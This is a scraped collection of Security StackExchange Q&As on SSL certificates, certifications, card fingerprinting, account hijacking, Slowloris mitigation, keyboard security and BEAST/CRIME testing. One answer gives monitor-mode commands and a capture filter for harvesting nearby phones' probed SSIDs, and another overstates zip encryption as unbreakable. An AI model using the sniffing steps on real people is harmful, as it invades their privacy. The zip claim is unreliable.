<p>Please keep in mind that it is better to not use the username-password combination in every request that you make. Better is to authenticate the user, generate a token server-side, communicate it to the client (e.g. in a cookie) and use that token as authentication for subsequent requests. This link can guide you in that process: <a href=""https://www.owasp.org/index.php/Session_Management_Cheat_Sheet"" rel=""nofollow noreferrer"">https://www.owasp.org/index.php/Session_Management_Cheat_Sheet</a> . </p>
","55694"
"Are there technical disadvantages in using free ssl certificates?","18989","","<p>Note <a href=""https://security.stackexchange.com/questions/18666/"">this question</a> is related, except this one is about <strong>free</strong> SSL certs.</p>

<p>There are providers who are offering totally free entry-level SSL certs (like StartSSL). I was wondering if they are technically the same thing as the paid ones (at least with the entry-level SSL certs like RapidSSL and PositiveSSL)? I do understand that extended/organization SSL is a different category, but if you only need entry-level SSL certs, are the free ones technically the same as the paid entry-level variants?</p>

<p>Moreover, if they are technically the same, why would you want to pay for something that's available free?</p>
","<p>At the byte level, X.509 is X.509 and there is no reason why the free SSL certificates would be any better or worse than the non-free -- the price is not written in the certificate. Any certificate provider can fumble the certificate generation, regardless of whether he gets paid for it or not.</p>

<p>The hard part of a certificate is outside of it: it is in the associated <em>procedures</em>, i.e. everything that is in place to manage the certificates: how the key holder is authenticated by the CA, how revocation can be triggered and corresponding information propagated, what kind of legal guarantee is offered by the CA, its insurance levels, its continuity plans...</p>

<p>For the certificate buyer, the big value in a particular CA is where the CA succeeded in placing its root key (browsers, operating systems...). The vendors (Microsoft, Mozilla...) tend to require quite a lot of administrativia and legal stuff from the CA before accepting to include the CA root key in their products, and such things are not free. Therefore, a CA which could get its root key distributed but emits certificates for free has a suspicious business plan. This is why the free-cert dealers also offer paid certificates with some extra characteristics (certs which last longer, certs with wildcard names, extra authentication procedures...): at some point, the CA operators must have an incoming cash flow. But, ultimately, that's the CA problem, not yours. If they are willing to give away certificates for free <em>and</em> Microsoft is OK with including their root key as a ""trusted by default key"" then there is no problem <em>for you</em> in using such certificates.</p>
","18921"
"How useful is CISSP to a recent graduate?","18979","","<p>I am a recent graduate and would like to move into the IT Security field. My degree was just straight CS with no particular security focus.</p>

<p>I have recently acquired a copy of a CISSP study guide and have started to work through it. Having discovered that candidates with less than 5 years experience can only sit the exam as an associate, I'm wondering: is it worth it at this stage in my career? Are there other certifications that would be more suitable for recent graduates?</p>
","<p>The CISSP certification is intended to demonstrate two things:</p>

<ol>
<li>Knowledge of the material in the ISC<sup>2</sup> CBK, <em>and</em></li>
<li>Significant real-world experience in the field</li>
</ol>

<p>To an employer, a CISSP on a resume is supposed to mean that the application knows what s/he is doing <em>and</em> has demonstrated it with years of experience.</p>

<p>Note that an employer looking for a CISSP for an entry-level position does not know what they are doing.  It's like requiring 10 years experience with Ruby on Rails, which has only been around for 7.  Also, requiring a senior-level cert for an entry-level job probably means the compensation won't match the job's responsibilities.</p>

<p>While you could take the exam now and become an Associate of ISC<sup>2</sup>, that doesn't buy you much.  An alternative could be to take the less rigorous <a href=""https://www.isc2.org/sscp-how-to-certify.aspx"">SSCP</a> exam, which only requires one year professional experience, or the <a href=""http://certification.comptia.org/getcertified/certifications/security.aspx"">Security+</a> exam which is a good starting point with essentially no prerequisites.</p>
","2134"
"Hashing a credit card number for use as a fingerprint","18942","","<p><img src=""https://i.stack.imgur.com/i9k08.png"" alt=""Transforming the credit card number into a fingerprint""></p>

<p>What's the best way to hash a credit card number so that it can be used for fingerprinting (i.e. so that comparing two hashes will let you know if the card numbers match or not)?</p>

<p>Ideally, I'm looking for recommendations of which hash + salt might be well suited for this use-case. The hash would uniquely identify a particular card number. You can use this attribute to check whether two customers who've signed up with you are using the same card number, for example. (since you wouldn't have access to the card numbers in plain text)</p>

<p><img src=""https://i.stack.imgur.com/TuPT5.png"" alt=""Fingerprints match""></p>

<p>To give this some context, see the <a href=""https://stripe.com/docs/api"" rel=""noreferrer"">Stripe API docs</a> and search for <code>fingerprint</code>. It's where I first heard about this concept. The credit card information will be stored on a secure machine (somewhere in the Stripe back-end) that's not accessible by the customer, and the API returns the fingerprint in order to allow the API consumer to make comparisons (e.g. to answer questions like <em>has this card been used before?</em>).</p>

<p>Let's make this one clear, coz I know you're going to ask: <strong>I'm not trying to replicate it. I'm just curious to understand how this could be implemented</strong></p>
","<p>I cannot comment on how Stripe does this but I can tell you exactly how <a href=""https://www.braintreepayments.com/"">Braintree</a> does it (because that is where I work). If I had to guess, Stripe probably uses a similar method.</p>

<p>In the Braintree API, we offer a <a href=""https://developers.braintreepayments.com/javascript+ruby/reference/objects/credit-card"">unique number identifier for a credit card</a>. This identifier is a random opaque token that will always be the same for card number stored in our system. The seed for this number is different per merchant in our system so you cannot compare them across merchants.</p>

<p>When a new card comes in, we look it up by comparing it to a hashed + salted column. If it matches that existing column we know we can return the same unique number identifier. If it doesn't match any existing record, we use a cryptographically secure pseudo-random number generator to create a new unique number identifier and ensure it doesn't conflict with an existing one.</p>

<p>This way the hashed + salted value never leaves our backend but we can still provide a way for a merchant to uniquely identify stored credit cards.</p>
","63333"
"Can password-protected zip files be broken without brute force?","18939","","<p>You have a zip file that you created with 7z to password-protect it with AES 128. Can a smart adversary extract the data only through brute force, or is the file vulnerable to other attacks - such as, I don't know, being able to bypass the password and extract the data?</p>
","<p>ZIP files are encrypted with AES-256, and the key is derived using a slow key-derivation function (KDF), which makes bruteforce and dictionary attacks generally infeasible. There are no currently known ways to bypass the encryption.</p>
","33418"
"xp_cmdshell: should it ever be used?","18934","","<p>Can <em>xp_cmdshell</em> ever be used safely within a stored proc and are there any situations for which there really is no other option? In other words, should its usage within a stored proc always be flagged as a security issue (as is advised by a well-known source code analyzer)?</p>

<p>Put differently, would you agree with the following statement (direct quote)?</p>

<blockquote>
  <p>The function <em>xp_cmdshell</em> cannot be used safely.  It should not be used.</p>
</blockquote>
","<p>It is always a <em>risk</em>. It should always be <em>reviewed</em>. It can be properly <em>mitigated</em>.</p>

<p>There are legitimate uses, sometimes necessities, but watch your input closely!</p>
","2723"
"Should I block the Yandex Bot?","18929","","<p>I have a web application that the Yandex spider is trying access into back-end a few times. After these spider searching, there are few Russian IP addresses that try to access back-end too and they failed to access. </p>

<p>Should I block Yandex or take another action?</p>

<p><strong>Update:</strong></p>

<p>The Yandex spider visits a back-end URL about once per 2-3 day. We did not release any back-end URL at the front-end.</p>

<p>The ""<strong>back-end</strong>"" meanings:
the web application's interface just allowing our administrative to manage the application</p>
","<blockquote>
  <p>Should i block Yandex</p>
</blockquote>

<p>Why?<br>
First, if the bot is a legitimate search engine bot (and nothing else), they won't hack you. If not, blocking a User agent won't help, they'll just use another one.<br>
If your password is good, fail2ban is configured, the software is up to date etc., just let them try. If not, you need to fix that, independent of any Yandex bots.  </p>

<p>To make sure the problem is actually Yandex, try disallowing it in robots.txt and see if it stops.<br>
No => not Yandex. </p>

<p>(Did set up a new webserver some weeks ago. One hour after going online, had not even a domain yet, a ""Googlebot"" started trying SQL injections for a non-existent Wordpress. It was fun to watch, as there were no other HTTP requests. But I did not block Google because of that.) </p>
","122693"
"Privacy implications of IDFA/IDFV? (iPhone/iOS)","18913","","<p>Apparently, iOS 6 introduced IDFA, ""identifier for advertisers"", which identifies your device so that advertisers can track you and send you ads.  It appears they also introduced IDFV, ""identifier for vendor"".</p>

<p>How do IDFA and IDFV work?  What exactly do they identify?  Are they different for each app on your phone, or are they the same for all apps on your phone?</p>

<p>What are the privacy implications of IDFA and IDFV?  Can they be used to track you?  How do they compare to UDID and to cookies on the web, as far as the privacy impact?</p>

<p>Do users have any way to tell which apps are gathering this information?  Also, if you set ""Limit Ad Tracking"" to On in settings, what happens under the covers?  How does that change what information apps receive?</p>

<p>Background: <a href=""http://www.businessinsider.com/ifa-apples-iphone-tracking-in-ios-6-2012-10"">Apple Has Quietly Started Tracking iPhone Users Again, And It's Tricky To Opt Out</a>; <a href=""http://apsalar.com/blog/2012/06/apples-new-advertising-id/"">Apsalar's Take on Apple's Recent Announcement</a>; <a href=""http://www.businessinsider.com/stop-tracking-on-iphone-2012-10"">How To Get Advertisers To Stop Tracking Your iPhone</a>.</p>
","<p>Ars Technica has <a href=""http://arstechnica.com/apple/2012/10/ask-ars-whats-the-difference-between-the-old-and-new-tracking-systems-on-ios/"" rel=""nofollow"">an article with an overview of IDFA and IDFV</a>.  It explains how these new mechanisms provide users with greater control over their privacy.</p>

<p>IDFA is a persistent identifier that is consistent across all apps, and thus allows cross-app tracking.  However, users can disable IDFA by setting ""Limit Ad Tracking"" to On.</p>

<p>IDFV is a persistent identifier that is different for each app.  This still allows tracking of users, but does not allow correlating your activities with one app against your activities with another app.</p>

<p>The comments on that article clarify that, if the user sets ""Limit Ad Tracking"" to On, then this sets a global flag (advertisingTrackingEnabled) that advertising code is supposed to check before reading the IDFA.  Advertisers are supposed to write their code to check this global flag and not collect the IDFA if it is set (though there is no technical measure that prevents them from doing so; they are on their honor).  Thus, in this sense it is vaguely akin to the ""Do Not Track"" flag.  Technically, it would be possible for an advertiser to still collect the IDFA even if the user has set ""Limit Ad Tracking"" to On.  We have to hope that Apple has a way to detect that and would ban the advertiser from the app store.</p>
","22947"
"Internet courtship: Why would a hacker buy me poker chips?","18912","","<p>Believe me, I never expected to ever write a title like that on a Stack Exchange site either!</p>

<p>Yesterday evening I got a call from my mother. She is quite tech savvy and generally knows her way <em>around</em> spam and viruses. However, yesterday she was startled: she got an email from Facebook thanking her for her purchase of 40 dollars worth of poker chips in the Facebook game TexasHoldEm. She was ultimately sure she had never done a purchase like that, but she was worried she had lost money one way or another.</p>

<p>The email seemed genuine. Logo, text, sender, and links all pointed to genuine Facebook resources. I decided to take a look and followed the link to the 'receipt'. A payment overview at Facebook.com opened and everything was documented as the email had stated: her account had acquired 40 dollars worth of poker chips in the app (game) TexasHoldEm. Surprisingly, though, those chips were paid with a PayPal-account registered to an email address we have never heard of:</p>

<pre><code>givenName.LastNameNumber@web.de
</code></pre>

<p>This is odd for two reasons: we live in Belgium, but have no relation, friends, family or otherwise, in Germany. Second we know no one by that name either.</p>

<p>At first I thought it may have been an error on that person's side, or that it is simply possible to 'donate' chips to someone else's Facebook account. But this would allow app developers to spam people who had never used their app with free gifts, so this seemed unlikely.</p>

<p>I then checked her account's recent activity, more specifically the 'recent sessions' tab. To my surprise there was indeed an active session in Düsseldorf, Germany. As a panic attack, I immediately ended that session. Unfortunately that also hid the information about that session. For me this meant only one thing: her account must have been hacked, as she hasn't been to Germany and there is no way there could be an active - poker-playing - Facebook instance there.</p>

<p>In light of this, I urged her to immediately change her password. After that, Facebook seems smart enough to know you made the change because you thought something was wrong: it proposed to go through her recent app activity and post and possibly deleting strange behaviour. Indeed, the app TexasHoldEm had been used, and there had been four posts (of the app on her behalf) that she had been playing the game - going back one whole week.</p>

<p>As a conclusion I would think that someone <em>hacked</em> my mother's account, played poker on it and paid for chips him/herself and ... That's it. Maybe I am getting old, but isn't this weird behaviour?</p>

<p><strong>Why would a hacker do this: hack some one's account, buy poker chips with <em>their own</em> PayPal account, and play the game? And how can I better protect myself against such 'attacks'?</strong></p>

<p>The poker chips were for <a href=""https://en.wikipedia.org/wiki/Zynga_Poker"" rel=""nofollow noreferrer"">Zynga's Poker game</a> on Facebook. As has been mentioned <a href=""https://security.stackexchange.com/questions/120443/internet-courtship-why-would-a-hacker-buy-me-poker-chips#comment219799_120447"">in the comments</a>, you cannot withdraw won money from this game. This is valuable - and intriguing - information which makes understanding the hacker's motives even harder.</p>
","<p>I interpret your question as:</p>

<blockquote>
  <p>What's the motivation for someone to use an alien Facebook account to play poker and stock it with chips?</p>
</blockquote>

<p>It's not that strange if you think about it this way:</p>

<p>As poker is a game where knowledge about the dealt cards gives you a significant edge in the game, you'd like to use sock puppets at a table to know more about the card distribution.</p>

<p>Thus, using sock puppets that are valid, active - real - Facebook accounts are the only way to gather more information without being spotted easily by heuristics.</p>

<p>Düsseldorf is where one of the big data centers in Germany is located, so there is a good chance that session was held by a bot on a server, not a real person.</p>

<p>Using two or three such bots on a table that are connected gives them a significant statistical edge to beat the other - real - players.</p>

<p>This (collusion) is probably illegal in most poker games and thus real accounts are used to make detection hard. Also, that's probably not the attacker's real name, their mail address and/or PayPal account.</p>

<p><strong>It is probably the account of another victim of identity theft.</strong></p>

<p>In the light of the other answer, I assume that Facebook handles the legal things when you marked the activities as fraudulent.</p>

<p><hr>
<strong>Update for modified question:</strong></p>

<p>As there seems to be no real money gains involved in this poker game instance, there is another valid reason to use your mom's account:</p>

<p>Because it offers anonymity. If the stolen PayPal account owner tracks the usage down, it'll be your mom as a suspect, not the actual hacker.</p>

<p>Using real, alien Facebook accounts offers another layer of protection with respect to law enforcement.</p>

<hr>

<p>There still remains the question of how the account was taken over. There are questions here that might answer that.</p>

<p><strong>If your mom does do <a href=""https://xkcd.com/792/"">password reuse</a>, you might educate her about the implications and urge her to change all passwords and use different, strong ones for all accounts.</strong></p>

<p>This would be a good time to introduce her to <a href=""https://security.stackexchange.com/questions/6095/xkcd-936-short-complex-password-or-long-dictionary-passphrase"">the famous xkcd about diceware</a> and/or a password manager, as <a href=""https://security.stackexchange.com/users/40538/david-z"">David</a> suggested in the comments.</p>

<p>Also, as <a href=""https://security.stackexchange.com/users/5405/s-l-barth"">S.L. Barth</a> suggests in the comments, using <a href=""https://en.wikipedia.org/wiki/Two-factor_authentication"">two-factor authentication</a> wherever possible is a good call in any case.</p>
","120447"
"Phones broadcast the SSIDs of all networks they have ever connected to. How can these be obtained by an attacker?","18908","","<p>I just watched an interesting talk from Glen Glenn Wilkinson titled: <em>The Machines that Betrayed their Masters</em>. </p>

<p>He said that your phone is constantly broadcasting all the SSIDs it has ever connected to. How would an attacker be able to capture these wifi requests?</p>
","<p>Fairly easy to be honest, all you need is to do is listen for Probe Requests. There is a nice blog explaining how to go about setting up a computer with BT5 to listen for them <a href=""http://blog.rootshell.be/2012/01/12/show-me-your-ssids-ill-tell-who-you-are/"">here</a>.</p>

<p>With a networking card that supports ""Monitor mode"", you are able to pick up so called ""Probe requests"". Once the networking card is set up to be in monitor mode you can use something like <a href=""http://www.aircrack-ng.org/"">aircrack</a>, <a href=""http://www.wireshark.org/"">wireshark</a> or <a href=""https://github.com/xme/hoover"">hoover</a> to capture the probe requests.</p>

<p>For example when using ubuntu and wireshark, set the network card in monitor mode:</p>

<pre><code>sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo ifconfig wlan0 up
</code></pre>

<p>Now start wireshark and set the filter for ""wlan.fc.type_subtype eq 4"".</p>

<p>That's it, now you can see all the SSIDs being probed for around you.</p>
","62126"
"Is it a good practice to show 403 unauthorized access error to user?","18888","","<p>Whenever we see a 403 forbidden access error page we think we have got to a place where some secret or private data is present. Now at this point bad guys know that this might be of interest and start to see if they can do something to get access to this secret data.</p>

<p>So is it good to show this error or just redirect to some other place?</p>

<p><strong>Edit</strong></p>

<p>I am thinking of dealing with error is to redirect to separate login page to access that particular resourse. But in this case also what if I simply don't want any one (may be even admin) to have access to these resource via my application. 
Offcourse admin can access the same resource by some other mean at the backend.</p>
","<p>In production environment, you usually want to disclose as little information as possible. For that purpose, it's preferable to show generic error codes:</p>

<ul>
<li><a href=""https://en.wikipedia.org/wiki/List_of_HTTP_status_codes#4xx_Client_Error"" rel=""noreferrer"">Error 400</a> for client-related errors: Bad request, authentication needed, etc.</li>
<li><a href=""https://en.wikipedia.org/wiki/List_of_HTTP_status_codes#5xx_Server_Error"" rel=""noreferrer"">Error 500</a> for server-related errors: Database down, site down for maintenance, etc.</li>
</ul>

<p>Ideally, you shouldn't opt for the default error pages provided by your webserver. You either <a href=""https://en.wikipedia.org/wiki/HTTP_404#Custom_error_pages"" rel=""noreferrer"">make your own error pages</a>, or edit the default error pages in a way that hides any information that could be used by an attacker. For example, here's an error from one of our servers when accessing a password-protected URL:</p>

<p><img src=""https://i.stack.imgur.com/O6Pri.png"" alt=""enter image description here""></p>

<p>Beyond that, it's a pure usability issue and it's greatly case-dependant. Shouldn't you redirect users to the homepage? Are those areas password-protected? Should you view a login form? Or do you simply want to show the generic error message with your site's style?</p>

<p>Here's an example of an error page on our site (Security.StackExchange)</p>

<p><img src=""https://i.stack.imgur.com/yvFTl.png"" alt=""enter image description here""></p>
","46172"
"How To Protect Tomcat 7 Against Slowloris Attack","18883","","<p>I'm using Apache Tomcat 7 to run my webapp on Linux. I scanned it by Acunetix and it's telling me that my webapp is vulnerable to ""Slow HTTP Denial of Service Attack"". How can I protect it?</p>

<p>Acunetix is reffering me to <a href=""http://blog.secaserver.com/2011/08/protect-apache-slowloris-attack/"">here</a>, but it's about securing Apache, not Tomcat.</p>
","<p>A CVE has been assigned specifically for this issue as it applies to Apache Tomcat: <a href=""http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-5568"">CVE-2012-5568</a>. More appropriate references there than the one you were given.</p>

<p>The Tomcat developers <a href=""http://tomcat.apache.org/security-7.html#Not_a_vulnerability_in_Tomcat"">do not consider this to be a vulnerability</a>, and have no plans to fix.</p>

<p>Potential solutions:</p>

<ul>
<li><p>Use firewall rules to prevent too many connections from a single host. This will mitigate run-of-the-mill Denial of Service attacks but not distributed ones (DDoS).</p>

<blockquote>
  <p>Here is an example of an iptables command which can be used to limit the number
  of concurrent connections that can be established to port 80 from a single
  client host:</p>
  
  <p><code># iptables -A INPUT -p tcp --syn --dport 80<br/>-m connlimit --connlimit-above 50 -j REJECT</code></p>
</blockquote>

<p><a href=""https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2007-6750"">https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2007-6750</a></p>

<p>This would, however, have side-effects if many users were legitimately connecting from a single IP (e.g. mega-proxy), so the number of connections would need to be tuned reasonably - dependant on the traffic expected.</p></li>
<li><p>Unfortunately, the best option is to place the Tomcat service downstream from a web server that can better handle HTTP connections, such as Apache. Then use an Apache solution such as mod_reqtimeout or mod_antiloris.</p></li>
</ul>
","52812"
"How secure is ""Secure Keyboard Entry"" in Mac OS X's Terminal?","18877","","<p>I've been using Terminal under Mac OS X for years but somehow missed to spot this feature:  </p>

<p><img src=""https://i.stack.imgur.com/eZw9U.png"" alt=""Secure Keyboard Entry in Terminal""></p>

<p>I'm now wondering how does this actually work, and is it 100% safe? If it isn't, what technique could be used to still get the keystrokes?</p>
","<p>""Secure Keyboard Entry"" maps to the <code>EnableSecureEventInput</code> function whose concept is described <a href=""https://developer.apple.com/library/mac/technotes/tn2150/_index.html"">here</a>. Basically, applications don't access the hardware themselves; they obtain <em>events</em> (e.g. about key strokes) from the operating system. Some elements in the OS decides what application gets what events, depending on its access rights and GUI state (there are details depending on which application is ""in the foreground"").</p>

<p>Applications can ""spy"" on each other, meaning (in this case) that an application running on the machine can ask to the OS to send it a copy of all key strokes even if they are meant for another application, and/or to inject synthetic events of its own. This is a <em>feature</em>: it allows things like ""password wallets"" (which enter a password as if it was typed by the user, from the point of view of the application) or the ""Keyboard Viewer"" (the GUI-based keyboard which allows you to ""type"" characters with the mouse and also shows what keys are actually being pressed at any time). <code>EnableSecureEventInput</code> blocks this feature for the application which calls it. Try it ! Run Terminal.app, enable the ""Keyboard Viewer"", and see that enabling ""Secure Keyboard Entry"" prevents the Keyboard Viewer from doing its job.</p>

<p>All these event routing is done in some user-space process which runs as <code>root</code>. This <em>relies</em> on the process separation enforced by the kernel: normal user process cannot fiddle at will with the memory allocated for a root process. The kernel itself is unaware of the user-level concept of ""event"". The management of events, in particular the enforcement (or not) of <code>EnableSecureEventInput</code>, is made by non-kernel code.</p>

<p>An interesting excerpt of the page linked above is the following:</p>

<blockquote>
  <p>The original implementation of <code>EnableSecureEventInput</code> was such that when a process enabled secure input entry and had keyboard focus, keyboard events were not passed to intercept processes. However, if the secure entry process was moved to the background, the system would continue to pass keyboard events to these intercept processes, since the keyboard focus was no longer to a secure entry process.</p>
  
  <p>Recently, a security hole was found that made it possible for an intercept process to capture keyboard events, even in cases where secure event input was enabled and the secure event input process was in the background. The fix for this problem is to stop passing keyboard events to any intercept process whenever any process has enabled secure event input, whether that process is in the foreground or background. This means that a process which enables secure event input and leaves secure event input enabled for the duration of the program, can affect all keyboard intercept processes, even when the secure event process has been moved to the background.</p>
</blockquote>

<p>This means that the event routing system actually got it wrong in the first installment of the feature. This is now supposed to be fixed.</p>

<p><strong>Even assuming</strong> that the event routing is now proper and secure, meaning that <code>EnableSecureEventInput</code>'s semantics are really enforced, then you must understand that this is completely relative to the process separation system. Any root process can inspect and modify at will the memory of all other process, and in particular see all the events; and a root process can also hook into the kernel and inspect the actual data from the keyboard bypassing the notion of event completely. A key logger which can be installed as root will do just that, and ""Secure Keyboard Entry"" will be defenceless against it. See <a href=""https://code.google.com/p/logkext/"">this</a> for an opensource proof of concept.</p>

<p>So ""Secure Keyboard Entry"" is secure only against attackers who could get to run some code of their own on the machine, but could not escalate their local privileges to root level. This is a rather restrictive scenario, because local privilege escalation tends to be possible on a general basis:</p>

<ul>
<li><p>Local process can see a lot of the machine, so the ""security perimeter"" to defend is huge in that case. Preventing intrusion from <em>remote</em> attackers is much easier, and yet already quite hard.</p></li>
<li><p>Apple tends to exhibit some <a href=""http://nakedsecurity.sophos.com/2013/08/29/apple-neglects-os-x-privilege-escalation-bug-for-six-months-gets-metasploit-on-its-case/"">lack of reactivity</a> in the case of local privilege escalation holes.</p></li>
</ul>

<hr />

<p><strong>Summary:</strong> I would find it overly optimistic to believe that ""Secure Keyboard Entry"" provides sufficient security against key loggers on, say, public shared computers. It is not a bad feature, but it fulfills its promises only if root and the kernel are free from malicious alterations, and that's a very big ""if"".</p>
","47786"
"Tools to test for BEAST/CRIME that AREN'T Internet-based?","18821","","<p>We have increasing pressure to identify and remediate any HTTPS server configurations that are vulnerable to <a href=""http://en.wikipedia.org/wiki/BEAST_%28computer_security%29#TLS_1.0"" rel=""nofollow noreferrer"">BEAST</a> (CBC) and <a href=""https://security.stackexchange.com/questions/19911/crime-how-to-beat-the-beast-successor"">CRIME</a> (compression).  We need to fix servers that are accessible to the Internet at large, servers that are only accessible to limited partner IP addresses via the Internet, and servers that are internal.</p>

<p>Servers available to the Internet at large can be scanned using <a href=""http://www.ssllabs.com"" rel=""nofollow noreferrer"">Qualys' SSL Labs</a> web service.  It gives clear indication of BEAST vulnerability, and presumably the ""Compression"" setting that isn't a bad sign today relates to CRIME and will start triggering an alert in the near future. <em>However</em>, this does not help with sites that aren't generally available via the Internet.</p>

<p>I can find all sorts of information on how to test things by hand - for example, <a href=""https://security.stackexchange.com/questions/11363/how-to-test-for-the-beast-attack-if-server-isnt-internet-connected?rq=1"">discussion of ciphers for BEAST</a> and <a href=""http://scottlinux.com/2012/09/13/enable-or-disable-compression-in-apache/"" rel=""nofollow noreferrer"">openssl s_client recipes for testing compression</a>.  However, in my old age I'm getting more fond of tools - like SSL Labs - that just tell me, rather than having to decipher the various openssl cipher strings (""No CBC, unless it's TLS 1.1+, in which case CBC is okay, and don't forget Tuesday"").</p>

<p>I also am leary that I'm unable to get a result indicating compression using various openssl + hand-coded HTTP headers on a web server that SSL Labs says has compression enabled.  Who do I believe?  I'm inclined to trust tools more than recipes, because tools are generally built upon a recipe that's then tested in a wide variety of setups and fixed, whereas recipes often worked for someone, somewhere, somewhen.</p>

<p>So what I'm looking for is a command-line tool like <a href=""http://sourceforge.net/projects/sslscan/"" rel=""nofollow noreferrer"">sslscan</a> which I can run against all my servers, regardless of their availability to the Internet at large.  (Yes, I realize sslscan prints out the ciphers, which I can interpret to determine BEAST vulnerability - but I want an expert (or just knowledgeable!) system which is <em>less fallible than I am</em> to look at that output and make the call).</p>
","<p><strong>Edit (2012/09/23):</strong> <a href=""http://www.bolet.org/TestSSLServer/"">Ask and ye shall receive</a>. <em>TestSSLServer</em> is a simple command-line tool which I wrote this week-end; it obtains from a given SSL/TLS server the list of supported cipher suites, protocol versions and support of TLS-level Deflate. It then gives a summary of the encryption strength and the vulnerability to BEAST and CRIME attacks. It is written in Java and should work ""everywhere"" (I only tested it from a Linux/ppc client, though).</p>

<p>(Note that BEAST and CRIME target the client, not the server. We are talking here about steps which the server can take to ""protect"" the client by not allowing it to use vulnerable feature combinations.)</p>

<hr />

<p><strong>Original response:</strong></p>

<p>For compression, there are <em>two</em> places where it may be activated; the blog post you link to talks about the wrong place, the one the CRIME attack is <em>not</em> about.</p>

<p>CRIME uses the compression which is at the SSL/TLS-level: a compression negotiated during the handshake, and which applies to every byte which is sent within the SSL/TLS tunnel. In a HTTPS context, this compression operates on both the HTTP request/response bodies and the HTTP <em>headers</em> (including the cookies, which is the point of CRIME). The compression which occurs at the <em>HTTP</em> level is the one which is specified with <em>HTTP</em> headers (like ""Accept-Encoding"") and which applies to the request/response <em>bodies</em> only. <em>That</em> compression does not cover the cookies (which are in the headers) and is thus, presumably, CRIME-free.</p>

<p>(This does not preclude the theoretical existence of a CRIME-like attack which abuses HTTP-level compression on the bodies, but it would require a request or response body which contains both confidential data, and data which the attacker can choose.)</p>

<p>To test a server for compression support, use this:</p>

<pre><code>openssl s_client -connect www.theservername.com:443
</code></pre>

<p>This will produce some output which contains the server's certificate, and ends with a block of text which looks like this:</p>

<pre><code>---
New, TLSv1/SSLv3, Cipher is DHE-RSA-AES256-SHA
Server public key is 2048 bit
Secure Renegotiation IS supported
Compression: zlib compression
Expansion: zlib compression
SSL-Session:
    Protocol  : TLSv1.1
    Cipher    : DHE-RSA-AES256-SHA
    Session-ID: 4B4110C44117BA0382CA6C3903A8185E0C156B253073E66B2D44F04B83611633
    Session-ID-ctx: 
    Master-Key: C11D38EE064BE6549364D54BD60E216E367A52825E62FFCCBEFC4AC8DB97D07BD72B7355CB268B91E3AD176EB69446AA
    Key-Arg   : None
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 300 (seconds)
    TLS session ticket:
    0000 - 4c f8 be c1 d1 0f cf 03-4a 99 89 8b 75 28 97 3c   L.......J...u(.&lt;
    0010 - 3e cf 2a b8 0f f0 d1 b4-7d c7 83 16 03 2c f0 8a   &gt;.*.....}....,..
    0020 - 1b a7 57 be dd 1b be a3-14 eb cf 34 42 99 e0 5a   ..W........4B..Z
    0030 - c5 96 43 da c7 d9 dd da-ed 4c e2 7c eb c1 8b a8   ..C......L.|....
    0040 - ce 73 c8 22 43 10 88 d6-d2 f2 df 91 9d 47 71 70   .s.""C........Gqp
    0050 - 77 bb c0 55 cd 46 34 3b-44 26 36 a1 7f 37 64 cd   w..U.F4;D&amp;6..7d.
    0060 - 72 64 66 89 cc f6 8b 23-17 9b 9a 91 23 6a f7 c2   rdf....#....#j..
    0070 - 8a e2 8c 10 85 8f b7 6c-60 d2 b6 72 b3 13 98 8b   .......l`..r....
    0080 - 75 da 68 cc 2a ca 4f fb-ec 4c f2 db 91 4a f7 2a   u.h.*.O..L...J.*
    0090 - 40 eb 92 44 c7 7a f7 84-ef 65 ea 2c 96 aa c5 ba   @..D.z...e.,....
    00a0 - c3 b5 76 6d 52 03 85 c9-27 53 a2 a4 70 54 06 37   ..vmR...'S..pT.7
    00b0 - 82 3e 09 93 21 6d f6 e7-eb cf c3 5e 26 19 e1 a2   .&gt;..!m.....^&amp;...

    Compression: 1 (zlib compression)
    Start Time: 1348073749
    Timeout   : 300 (sec)
    Verify return code: 20 (unable to get local issuer certificate)
---
</code></pre>

<p>This was done on a server which supports TLS-level compression. You see ""<code>zlib compression</code>"" in three places: Deflate compression is indeed supported by this server. Note that there is not a single sign of a HTTP header anywhere ! Just type the <code>openssl</code> command, and look at the output. No need to enter a HTTP header.</p>

<p>On a server which does NOT support TLS-level compression, things will look like this:</p>

<pre><code>---
New, TLSv1/SSLv3, Cipher is ECDHE-RSA-RC4-SHA
Server public key is 1024 bit
Secure Renegotiation IS supported
Compression: NONE
Expansion: NONE
SSL-Session:
    Protocol  : TLSv1.1
    Cipher    : ECDHE-RSA-RC4-SHA
    Session-ID: 59D609F13BEE9157D26318ADB12F4CF219EF7A1BC2C87AF84AD66773303F90A6
    Session-ID-ctx: 
    Master-Key: 1DD9E0C306A86A7EC823561EF0B1F47B63E70B43D57F3B3FBB3D389863F540E3B4CCE5DE454E6D19811C24001E95777A
    Key-Arg   : None
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 100800 (seconds)
    TLS session ticket:
    0000 - de c6 06 25 10 c9 22 38-c4 1f 82 d7 c7 b5 62 08   ...%..""8......b.
    0010 - 01 c0 e1 26 e2 64 8a 62-99 74 85 bb 60 bf a8 e0   ...&amp;.d.b.t..`...
    0020 - 65 08 74 89 d5 62 45 e9-b4 f0 80 4e f7 bd ff d5   e.t..bE....N....
    0030 - 6a 12 3b 90 97 ca 7a f4-d1 1b e1 0d 89 d2 52 49   j.;...z.......RI
    0040 - 11 fe 92 82 94 70 ba 4b-5e 81 ff f2 12 62 f4 79   .....p.K^....b.y
    0050 - 11 eb 74 7a d6 ee 10 4e-b5 6d 50 8d 1c 1c 8e 57   ..tz...N.mP....W
    0060 - 19 46 67 91 89 2e 45 28-2e 49 94 8e c8 32 28 bf   .Fg...E(.I...2(.
    0070 - 7b 73 82 ab 63 c4 b7 8f-5c b3 1b 5c 74 59 3c 8d   {s..c...\..\tY&lt;.
    0080 - ec 8a 6a 3a 28 c2 82 c1-d7 d5 4f ec 7e 79 e7 57   ..j:(.....O.~y.W
    0090 - 4a f9 45 e7                                       J.E.

    Start Time: 1348074257
    Timeout   : 300 (sec)
    Verify return code: 20 (unable to get local issuer certificate)
---
</code></pre>

<p>The ""<code>Compression: NONE</code>"" shows that this second server indeed rejects usage of TLS-level compression.</p>

